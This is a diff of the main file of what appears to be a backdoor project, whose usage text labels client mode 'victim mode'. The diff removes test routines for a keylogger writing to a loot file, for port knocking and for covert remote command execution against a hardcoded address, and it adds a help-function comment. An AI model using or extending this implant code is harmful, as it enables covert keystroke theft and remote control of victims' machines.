@@ -14,73 +14,6 @@
 
 #include "Keylogger.h"
 
-const short sport = 42069;
-const short dport = 7575;
-
-const std::string testCmd("uname -an");
-unsigned int testAddr = 0xc0a80166;
-
-UCharVector data({'a', 'b', 'c', 'd', 'e'});
-
-// TODO: Remove
-void testKeylogger(const Properties &p) {
-    Keylogger kl(p.at("keylogLootFile"));
-    kl.start_logging(); // should be started in another thread
-}
-
-// TODO: Remove
-void testKnock(const Properties &p) {
-    const std::string &interface = p.at("interface");
-    const std::string &key = p.at("key");
-
-    const std::string &knockPattern = p.at("knockPattern");
-    unsigned short knockPort = std::stoi(p.at("knockPort"));
-    unsigned int knockDuration = std::stoi(p.at("knockDuration"));
-
-    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
-    netEngine.startAsyncSniff("ip and udp");
-    netEngine.knockAndSend(*netEngine.getIp(), data);
-    netEngine.stopAsyncSniff();
-}
-
-// TODO: Remove
-void testRce(const Properties &p) {
-    const std::string &interface = p.at("interface");
-    const std::string &key = p.at("key");
-
-    const std::string &knockPattern = p.at("knockPattern");
-    unsigned short knockPort = std::stoi(p.at("knockPort"));
-    unsigned int knockDuration = std::stoi(p.at("knockDuration"));
-
-    struct in_addr daddr;
-    daddr.s_addr = testAddr;
-
-    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
-
-    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
-    netEngine.startAsyncSniff("ip and tcp");
-
-    sleep(1);
-    RemoteCodeExecuter::sendCommand(&netEngine, daddr, testCmd);
-
-    sleep(30);
-    netEngine.stopAsyncSniff();
-}
-
-// TODO: Remove
-void testRceRes(const Properties &p) {
-    const std::string &interface = p.at("interface");
-    const std::string &key = p.at("key");
-
-    const std::string &knockPattern = p.at("knockPattern");
-    unsigned short knockPort = std::stoi(p.at("knockPort"));
-    unsigned int knockDuration = std::stoi(p.at("knockDuration"));
-
-    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
-
-    RemoteCodeExecuter::executeCommand(&netEngine, testAddr, testCmd.c_str());
-}
-
 // TODO: Remove
 void testFileMonitor() {
     EventCallback created = [&](const FileMonitor *fm, struct inotify_event *e) {
@@ -137,6 +70,12 @@ int main(int argc, char *argv[]) {
     return 0;
 }
 
+/*
+ * Prints the help menu of the program.
+ *
+ * Params:
+ *      const char *name: The name of the application, argv[0].
+ */
 void printUsage(const char *name) {
     std::cout << "Usage: " << name << " [client|server|test]" << std::endl;
     std::cout << "\tclient - client mode a.k.a victim mode" << std::endl;
